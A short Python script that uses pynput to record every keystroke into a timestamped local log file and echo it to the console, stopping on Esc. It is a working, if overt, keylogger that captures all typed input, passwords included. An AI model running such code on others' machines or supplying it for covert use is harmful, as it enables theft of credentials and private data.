import pynput
from pynput.keyboard import Key, Listener
import datetime

# Create a log file name with a timestamp
log_file = f'key_log_{datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")}.txt'

def on_press(key):
    try:
        with open(log_file, 'a') as f:
            f.write(key.char)
        print(f'Key pressed: {key.char}')
    except AttributeError:
        if key == Key.space:
            with open(log_file, 'a') as f:
                f.write(' ')
            print(f'Space bar pressed')
        elif key == Key.enter:
            with open(log_file, 'a') as f:
                f.write('\n')
            print(f'Enter key pressed')
        else:
            with open(log_file, 'a') as f:
                f.write(f'[{key}]')
            print(f'Special key pressed: {key}')

def on_release(key):
    if key == Key.esc:
        # Stop listener
        return False

# Collect events until released
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()